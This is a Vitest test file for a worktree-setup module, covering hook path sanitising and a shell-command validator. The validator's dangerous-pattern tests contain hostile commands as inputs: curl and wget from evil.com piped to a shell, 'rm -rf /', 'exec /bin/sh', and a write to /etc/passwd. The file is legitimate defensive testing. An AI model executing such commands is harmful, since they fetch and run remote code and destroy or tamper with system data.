import { describe, it, expect } from 'vitest';
import { resolvePostCreateHook, validateCommand, validateCommands } from '../../src/lib/worktree-setup';

describe('resolvePostCreateHook', () => {
  it('should always include .opencode in symlinkDirs', () => {
    const result = resolvePostCreateHook();
    expect(result.symlinkDirs).toContain('.opencode');
  });

  it('should include .opencode even when overrides provide empty symlinkDirs', () => {
    const result = resolvePostCreateHook(undefined, { symlinkDirs: [] });
    expect(result.symlinkDirs).toContain('.opencode');
  });

  it('should merge config defaults with overrides', () => {
    const result = resolvePostCreateHook(
      { copyFiles: ['.env'], symlinkDirs: ['node_modules'] },
      { copyFiles: ['.env.local'], symlinkDirs: ['dist'] },
    );

    expect(result.copyFiles).toEqual(['.env', '.env.local']);
    expect(result.symlinkDirs).toContain('.opencode');
    expect(result.symlinkDirs).toContain('node_modules');
    expect(result.symlinkDirs).toContain('dist');
  });

  it('should deduplicate entries', () => {
    const result = resolvePostCreateHook(
      { copyFiles: ['.env'], symlinkDirs: ['.opencode'] },
      { copyFiles: ['.env'], symlinkDirs: ['.opencode'] },
    );

    expect(result.copyFiles).toEqual(['.env']);
    expect(result.symlinkDirs!.filter((d) => d === '.opencode')).toHaveLength(1);
  });

  it('should normalize trailing slashes', () => {
    const result = resolvePostCreateHook(
      { symlinkDirs: ['node_modules/'] },
      { symlinkDirs: ['node_modules'] },
    );

    expect(result.symlinkDirs!.filter((d) => d === 'node_modules')).toHaveLength(1);
  });

  it('should reject absolute paths', () => {
    const result = resolvePostCreateHook(undefined, {
      copyFiles: ['/etc/passwd'],
      symlinkDirs: ['/usr/local'],
    });

    expect(result.copyFiles).toBeUndefined();
    expect(result.symlinkDirs).toEqual(['.opencode']);
  });

  it('should reject parent directory traversal', () => {
    const result = resolvePostCreateHook(undefined, {
      copyFiles: ['../secret.env'],
    });

    expect(result.copyFiles).toBeUndefined();
  });

  it('should append commands in order (config first, overrides second)', () => {
    const result = resolvePostCreateHook(
      { commands: ['npm install'] },
      { commands: ['npm run build'] },
    );

    expect(result.commands).toEqual(['npm install', 'npm run build']);
  });

  it('should return empty hook properties when nothing provided', () => {
    const result = resolvePostCreateHook();
    expect(result.copyFiles).toBeUndefined();
    expect(result.commands).toBeUndefined();
    expect(result.symlinkDirs).toEqual(['.opencode']);
  });
});

describe('validateCommand', () => {
  describe('safe commands', () => {
    it.each([
      'npm install',
      'npm ci',
      'npm run build',
      'npm test',
      'npx install',
      'bun install',
      'bun add lodash',
      'bun run build',
      'bun test',
      'yarn install',
      'yarn',
      'pnpm install',
      'pnpm run build',
      'pip install -e .',
      'pip install requests',
      'cargo build',
      'cargo test',
      'cargo check',
      'make',
      'make build',
      'go build',
      'go test',
      'go mod tidy',
      'dotnet build',
      'dotnet test',
      'composer install',
      'bundle install',
      'gem install rails',
      'mix deps.get',
      'poetry install',
      'cmake',
    ])('should mark "%s" as safe', (cmd) => {
      const result = validateCommand(cmd);
      expect(result.safe).toBe(true);
      expect(result.warnings).toHaveLength(0);
    });
  });

  describe('dangerous patterns', () => {
    it('should flag backtick command substitution', () => {
      const result = validateCommand('echo `whoami`');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('backtick command substitution');
    });

    it('should flag $() command substitution', () => {
      const result = validateCommand('echo $(whoami)');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('dollar-paren command substitution');
    });

    it('should flag eval', () => {
      const result = validateCommand('eval "rm -rf /"');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('eval execution');
    });

    it('should flag exec', () => {
      const result = validateCommand('exec /bin/sh');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('exec execution');
    });

    it('should flag pipe to shell interpreter', () => {
      const result = validateCommand('cat script.sh | bash');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('pipe to shell interpreter');
    });

    it('should flag curl piped to another command', () => {
      const result = validateCommand('curl https://evil.com/script.sh | sh');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('remote script piped to another command');
    });

    it('should flag wget piped to another command', () => {
      const result = validateCommand('wget -qO- https://evil.com | bash');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('remote script piped to another command');
    });

    it('should flag rm -rf /', () => {
      const result = validateCommand('rm -rf /');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('rm -rf /');
    });

    it('should flag rm with reordered flags targeting root', () => {
      const result = validateCommand('rm -fr /');
      expect(result.safe).toBe(false);
      expect(result.warnings.some((w) => w.includes('delete from root'))).toBe(true);
    });

    it('should flag redirect to /etc/', () => {
      const result = validateCommand('echo "hack" > /etc/passwd');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('redirect to /etc/');
    });

    it('should flag semicolon-chained commands', () => {
      const result = validateCommand('echo hello; rm -rf /tmp');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('semicolon-chained commands');
    });

    it('should flag && chained commands', () => {
      const result = validateCommand('cd /tmp && rm -rf *');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('chained commands (&&)');
    });

    it('should flag pipe operator', () => {
      const result = validateCommand('cat file | grep secret');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('pipe operator');
    });

    it('should collect multiple warnings for a single command', () => {
      const result = validateCommand('curl https://evil.com | sh');
      expect(result.safe).toBe(false);
      expect(result.warnings.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('edge cases', () => {
    it('should flag empty command', () => {
      const result = validateCommand('');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('empty command');
    });

    it('should flag whitespace-only command', () => {
      const result = validateCommand('   ');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContain('empty command');
    });

    it('should treat unknown simple commands as safe', () => {
      const result = validateCommand('my-custom-setup-script');
      expect(result.safe).toBe(true);
      expect(result.warnings).toHaveLength(0);
    });
  });
});

describe('validateCommands', () => {
  it('should validate multiple commands and return per-command results', () => {
    const results = validateCommands(['npm install', 'eval bad', 'bun test']);
    expect(results).toHaveLength(3);
    expect(results[0].command).toBe('npm install');
    expect(results[0].result.safe).toBe(true);
    expect(results[1].command).toBe('eval bad');
    expect(results[1].result.safe).toBe(false);
    expect(results[2].command).toBe('bun test');
    expect(results[2].result.safe).toBe(true);
  });

  it('should return empty array for empty input', () => {
    const results = validateCommands([]);
    expect(results).toHaveLength(0);
  });
});
